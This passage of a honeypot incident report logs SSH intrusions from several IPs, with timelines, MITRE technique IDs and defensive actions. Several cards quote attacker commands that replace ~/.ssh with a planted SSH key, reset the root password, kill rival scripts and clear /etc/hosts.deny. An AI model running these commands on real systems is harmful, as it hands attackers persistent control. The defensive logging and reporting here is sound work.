| `2026-04-13 16:25:21` | `cowrie.command.failed` |
| `2026-04-13 16:25:21` | `cowrie.log.closed` |
| `2026-04-13 16:25:21` | `cowrie.session.params` |
| `2026-04-13 16:25:21` | `cowrie.command.input` |
| `2026-04-13 16:25:21` | `cowrie.session.file_download` |
| `2026-04-13 16:25:21` | `cowrie.log.closed` |
| `2026-04-13 16:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0773560e5149

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:25 |
| **Last Seen** | 2026-04-13 16:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:25:23` | `cowrie.session.connect` |
| `2026-04-13 16:25:23` | `cowrie.client.version` |
| `2026-04-13 16:25:23` | `cowrie.client.kex` |
| `2026-04-13 16:25:24` | `cowrie.login.success` |
| `2026-04-13 16:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a292a52620ab

| Field | Detail |
|---|---|
| **Source IP** | `171.214.220[.]133` |
| **First Seen** | 2026-04-13 16:26 |
| **Last Seen** | 2026-04-13 16:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:26:34` | `cowrie.session.connect` |
| `2026-04-13 16:26:34` | `cowrie.client.version` |
| `2026-04-13 16:26:35` | `cowrie.client.kex` |
| `2026-04-13 16:26:35` | `cowrie.login.success` |
| `2026-04-13 16:26:36` | `cowrie.session.params` |
| `2026-04-13 16:26:36` | `cowrie.command.input` |
| `2026-04-13 16:26:36` | `cowrie.command.failed` |
| `2026-04-13 16:26:36` | `cowrie.log.closed` |
| `2026-04-13 16:26:37` | `cowrie.session.params` |
| `2026-04-13 16:26:37` | `cowrie.command.input` |
| `2026-04-13 16:26:37` | `cowrie.session.file_download` |
| `2026-04-13 16:26:37` | `cowrie.log.closed` |
| `2026-04-13 16:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.214.220[.]133` to AbuseIPDB if not already reported
- [ ] Block `171.214.220[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95907ecfb965

| Field | Detail |
|---|---|
| **Source IP** | `171.214.220[.]133` |
| **First Seen** | 2026-04-13 16:26 |
| **Last Seen** | 2026-04-13 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:26:40` | `cowrie.session.connect` |
| `2026-04-13 16:26:40` | `cowrie.client.version` |
| `2026-04-13 16:26:40` | `cowrie.client.kex` |
| `2026-04-13 16:26:41` | `cowrie.login.success` |
| `2026-04-13 16:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.214.220[.]133` to AbuseIPDB if not already reported
- [ ] Block `171.214.220[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-592d5f42a2a4

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:27 |
| **Last Seen** | 2026-04-13 16:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:27:04` | `cowrie.session.connect` |
| `2026-04-13 16:27:04` | `cowrie.client.version` |
| `2026-04-13 16:27:04` | `cowrie.client.kex` |
| `2026-04-13 16:27:05` | `cowrie.login.success` |
| `2026-04-13 16:27:05` | `cowrie.session.params` |
| `2026-04-13 16:27:05` | `cowrie.command.input` |
| `2026-04-13 16:27:05` | `cowrie.command.failed` |
| `2026-04-13 16:27:05` | `cowrie.log.closed` |
| `2026-04-13 16:27:05` | `cowrie.session.params` |
| `2026-04-13 16:27:05` | `cowrie.command.input` |
| `2026-04-13 16:27:05` | `cowrie.session.file_download` |
| `2026-04-13 16:27:05` | `cowrie.log.closed` |
| `2026-04-13 16:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4744822bf56c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:27 |
| **Last Seen** | 2026-04-13 16:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:27:07` | `cowrie.session.connect` |
| `2026-04-13 16:27:07` | `cowrie.client.version` |
| `2026-04-13 16:27:07` | `cowrie.client.kex` |
| `2026-04-13 16:27:08` | `cowrie.login.success` |
| `2026-04-13 16:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e38cbeb8f8f7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:28 |
| **Last Seen** | 2026-04-13 16:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:28:37` | `cowrie.session.connect` |
| `2026-04-13 16:28:37` | `cowrie.client.version` |
| `2026-04-13 16:28:37` | `cowrie.client.kex` |
| `2026-04-13 16:28:38` | `cowrie.login.success` |
| `2026-04-13 16:28:38` | `cowrie.session.params` |
| `2026-04-13 16:28:38` | `cowrie.command.input` |
| `2026-04-13 16:28:38` | `cowrie.command.failed` |
| `2026-04-13 16:28:38` | `cowrie.log.closed` |
| `2026-04-13 16:28:38` | `cowrie.session.params` |
| `2026-04-13 16:28:38` | `cowrie.command.input` |
| `2026-04-13 16:28:39` | `cowrie.session.file_download` |
| `2026-04-13 16:28:39` | `cowrie.log.closed` |
| `2026-04-13 16:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb4d2fa1b6f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:28 |
| **Last Seen** | 2026-04-13 16:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:28:40` | `cowrie.session.connect` |
| `2026-04-13 16:28:40` | `cowrie.client.version` |
| `2026-04-13 16:28:40` | `cowrie.client.kex` |
| `2026-04-13 16:28:41` | `cowrie.login.success` |
| `2026-04-13 16:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02eccf3e736b

| Field | Detail |
|---|---|
| **Source IP** | `171.214.220[.]133` |
| **First Seen** | 2026-04-13 16:28 |
| **Last Seen** | 2026-04-13 16:29 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CjUNQ0qupMgA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:28:57` | `cowrie.session.connect` |
| `2026-04-13 16:28:57` | `cowrie.client.version` |
| `2026-04-13 16:28:57` | `cowrie.client.kex` |
| `2026-04-13 16:28:58` | `cowrie.login.success` |
| `2026-04-13 16:28:59` | `cowrie.session.params` |
| `2026-04-13 16:28:59` | `cowrie.command.input` |
| `2026-04-13 16:28:59` | `cowrie.command.failed` |
| `2026-04-13 16:28:59` | `cowrie.log.closed` |
| `2026-04-13 16:28:59` | `cowrie.session.params` |
| `2026-04-13 16:28:59` | `cowrie.command.input` |
| `2026-04-13 16:28:59` | `cowrie.session.file_download` |
| `2026-04-13 16:28:59` | `cowrie.log.closed` |
| `2026-04-13 16:29:12` | `cowrie.session.params` |
| `2026-04-13 16:29:12` | `cowrie.command.input` |
| `2026-04-13 16:29:12` | `cowrie.log.closed` |
| `2026-04-13 16:29:12` | `cowrie.session.params` |
| `2026-04-13 16:29:12` | `cowrie.command.input` |
| `2026-04-13 16:29:12` | `cowrie.log.closed` |
| `2026-04-13 16:29:13` | `cowrie.session.params` |
| `2026-04-13 16:29:13` | `cowrie.command.input` |
| `2026-04-13 16:29:13` | `cowrie.session.file_download` |
| `2026-04-13 16:29:13` | `cowrie.log.closed` |
| `2026-04-13 16:29:13` | `cowrie.session.params` |
| `2026-04-13 16:29:13` | `cowrie.command.input` |
| `2026-04-13 16:29:14` | `cowrie.log.closed` |
| `2026-04-13 16:29:14` | `cowrie.session.params` |
| `2026-04-13 16:29:14` | `cowrie.command.input` |
| `2026-04-13 16:29:14` | `cowrie.log.closed` |
| `2026-04-13 16:29:15` | `cowrie.session.params` |
| `2026-04-13 16:29:15` | `cowrie.command.input` |
| `2026-04-13 16:29:15` | `cowrie.command.input` |
| `2026-04-13 16:29:15` | `cowrie.log.closed` |
| `2026-04-13 16:29:15` | `cowrie.session.params` |
| `2026-04-13 16:29:15` | `cowrie.command.input` |
| `2026-04-13 16:29:15` | `cowrie.log.closed` |
| `2026-04-13 16:29:16` | `cowrie.session.params` |
| `2026-04-13 16:29:16` | `cowrie.command.input` |
| `2026-04-13 16:29:16` | `cowrie.log.closed` |
| `2026-04-13 16:29:16` | `cowrie.session.params` |
| `2026-04-13 16:29:16` | `cowrie.command.input` |
| `2026-04-13 16:29:17` | `cowrie.log.closed` |
| `2026-04-13 16:29:17` | `cowrie.session.params` |
| `2026-04-13 16:29:17` | `cowrie.command.input` |
| `2026-04-13 16:29:17` | `cowrie.log.closed` |
| `2026-04-13 16:29:18` | `cowrie.session.params` |
| `2026-04-13 16:29:18` | `cowrie.command.input` |
| `2026-04-13 16:29:18` | `cowrie.log.closed` |
| `2026-04-13 16:29:18` | `cowrie.session.params` |
| `2026-04-13 16:29:18` | `cowrie.command.input` |
| `2026-04-13 16:29:18` | `cowrie.log.closed` |
| `2026-04-13 16:29:19` | `cowrie.session.params` |
| `2026-04-13 16:29:19` | `cowrie.command.input` |
| `2026-04-13 16:29:19` | `cowrie.log.closed` |
| `2026-04-13 16:29:19` | `cowrie.session.params` |
| `2026-04-13 16:29:19` | `cowrie.command.input` |
| `2026-04-13 16:29:20` | `cowrie.log.closed` |
| `2026-04-13 16:29:20` | `cowrie.session.params` |
| `2026-04-13 16:29:20` | `cowrie.command.input` |
| `2026-04-13 16:29:20` | `cowrie.log.closed` |
| `2026-04-13 16:29:21` | `cowrie.session.params` |
| `2026-04-13 16:29:21` | `cowrie.command.input` |
| `2026-04-13 16:29:21` | `cowrie.log.closed` |
| `2026-04-13 16:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.214.220[.]133` to AbuseIPDB if not already reported
- [ ] Block `171.214.220[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5da5a402723

| Field | Detail |
|---|---|
| **Source IP** | `171.214.220[.]133` |
| **First Seen** | 2026-04-13 16:29 |
| **Last Seen** | 2026-04-13 16:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:29:31` | `cowrie.session.connect` |
| `2026-04-13 16:29:31` | `cowrie.client.version` |
| `2026-04-13 16:29:32` | `cowrie.client.kex` |
| `2026-04-13 16:29:32` | `cowrie.login.success` |
| `2026-04-13 16:29:33` | `cowrie.session.params` |
| `2026-04-13 16:29:33` | `cowrie.command.input` |
| `2026-04-13 16:29:33` | `cowrie.command.failed` |
| `2026-04-13 16:29:33` | `cowrie.log.closed` |
| `2026-04-13 16:29:33` | `cowrie.session.params` |
| `2026-04-13 16:29:33` | `cowrie.command.input` |
| `2026-04-13 16:29:34` | `cowrie.session.file_download` |
| `2026-04-13 16:29:34` | `cowrie.log.closed` |
| `2026-04-13 16:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.214.220[.]133` to AbuseIPDB if not already reported
- [ ] Block `171.214.220[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e6f4bfd6ccf

| Field | Detail |
|---|---|
| **Source IP** | `171.214.220[.]133` |
| **First Seen** | 2026-04-13 16:29 |
| **Last Seen** | 2026-04-13 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:29:40` | `cowrie.session.connect` |
| `2026-04-13 16:29:40` | `cowrie.client.version` |
| `2026-04-13 16:29:40` | `cowrie.client.kex` |
| `2026-04-13 16:29:41` | `cowrie.login.success` |
| `2026-04-13 16:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.214.220[.]133` to AbuseIPDB if not already reported
- [ ] Block `171.214.220[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e91ae0960ef0

| Field | Detail |
|---|---|
| **Source IP** | `118.196.34[.]237` |
| **First Seen** | 2026-04-13 16:32 |
| **Last Seen** | 2026-04-13 16:32 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:G8fsFJYM17Jt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:32:26` | `cowrie.session.connect` |
| `2026-04-13 16:32:26` | `cowrie.client.version` |
| `2026-04-13 16:32:26` | `cowrie.client.kex` |
| `2026-04-13 16:32:27` | `cowrie.login.success` |
| `2026-04-13 16:32:27` | `cowrie.session.params` |
| `2026-04-13 16:32:27` | `cowrie.command.input` |
| `2026-04-13 16:32:27` | `cowrie.command.failed` |
| `2026-04-13 16:32:27` | `cowrie.log.closed` |
| `2026-04-13 16:32:27` | `cowrie.session.params` |
| `2026-04-13 16:32:27` | `cowrie.command.input` |
| `2026-04-13 16:32:28` | `cowrie.session.file_download` |
| `2026-04-13 16:32:28` | `cowrie.log.closed` |
| `2026-04-13 16:32:41` | `cowrie.session.params` |
| `2026-04-13 16:32:41` | `cowrie.command.input` |
| `2026-04-13 16:32:41` | `cowrie.log.closed` |
| `2026-04-13 16:32:41` | `cowrie.session.params` |
| `2026-04-13 16:32:41` | `cowrie.command.input` |
| `2026-04-13 16:32:41` | `cowrie.log.closed` |
| `2026-04-13 16:32:42` | `cowrie.session.params` |
| `2026-04-13 16:32:42` | `cowrie.command.input` |
| `2026-04-13 16:32:42` | `cowrie.session.file_download` |
| `2026-04-13 16:32:42` | `cowrie.log.closed` |
| `2026-04-13 16:32:42` | `cowrie.session.params` |
| `2026-04-13 16:32:42` | `cowrie.command.input` |
| `2026-04-13 16:32:42` | `cowrie.log.closed` |
| `2026-04-13 16:32:43` | `cowrie.session.params` |
| `2026-04-13 16:32:43` | `cowrie.command.input` |
| `2026-04-13 16:32:43` | `cowrie.log.closed` |
| `2026-04-13 16:32:43` | `cowrie.session.params` |
| `2026-04-13 16:32:43` | `cowrie.command.input` |
| `2026-04-13 16:32:43` | `cowrie.command.input` |
| `2026-04-13 16:32:43` | `cowrie.log.closed` |
| `2026-04-13 16:32:43` | `cowrie.session.params` |
| `2026-04-13 16:32:43` | `cowrie.command.input` |
| `2026-04-13 16:32:44` | `cowrie.log.closed` |
| `2026-04-13 16:32:44` | `cowrie.session.params` |
| `2026-04-13 16:32:44` | `cowrie.command.input` |
| `2026-04-13 16:32:44` | `cowrie.log.closed` |
| `2026-04-13 16:32:44` | `cowrie.session.params` |
| `2026-04-13 16:32:44` | `cowrie.command.input` |
| `2026-04-13 16:32:44` | `cowrie.log.closed` |
| `2026-04-13 16:32:45` | `cowrie.session.params` |
| `2026-04-13 16:32:45` | `cowrie.command.input` |
| `2026-04-13 16:32:45` | `cowrie.log.closed` |
| `2026-04-13 16:32:45` | `cowrie.session.params` |
| `2026-04-13 16:32:45` | `cowrie.command.input` |
| `2026-04-13 16:32:45` | `cowrie.log.closed` |
| `2026-04-13 16:32:46` | `cowrie.session.params` |
| `2026-04-13 16:32:46` | `cowrie.command.input` |
| `2026-04-13 16:32:46` | `cowrie.log.closed` |
| `2026-04-13 16:32:46` | `cowrie.session.params` |
| `2026-04-13 16:32:46` | `cowrie.command.input` |
| `2026-04-13 16:32:46` | `cowrie.log.closed` |
| `2026-04-13 16:32:46` | `cowrie.session.params` |
| `2026-04-13 16:32:46` | `cowrie.command.input` |
| `2026-04-13 16:32:47` | `cowrie.log.closed` |
| `2026-04-13 16:32:47` | `cowrie.session.params` |
| `2026-04-13 16:32:47` | `cowrie.command.input` |
| `2026-04-13 16:32:47` | `cowrie.log.closed` |
| `2026-04-13 16:32:47` | `cowrie.session.params` |
| `2026-04-13 16:32:47` | `cowrie.command.input` |
| `2026-04-13 16:32:47` | `cowrie.log.closed` |
| `2026-04-13 16:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.34[.]237` to AbuseIPDB if not already reported
- [ ] Block `118.196.34[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14cb10b517b4

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:41 |
| **Last Seen** | 2026-04-13 16:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:41:08` | `cowrie.session.connect` |
| `2026-04-13 16:41:08` | `cowrie.client.version` |
| `2026-04-13 16:41:08` | `cowrie.client.kex` |
| `2026-04-13 16:41:08` | `cowrie.login.success` |
| `2026-04-13 16:41:09` | `cowrie.session.params` |
| `2026-04-13 16:41:09` | `cowrie.command.input` |
| `2026-04-13 16:41:09` | `cowrie.command.failed` |
| `2026-04-13 16:41:09` | `cowrie.log.closed` |
| `2026-04-13 16:41:09` | `cowrie.session.params` |
| `2026-04-13 16:41:09` | `cowrie.command.input` |
| `2026-04-13 16:41:09` | `cowrie.session.file_download` |
| `2026-04-13 16:41:09` | `cowrie.log.closed` |
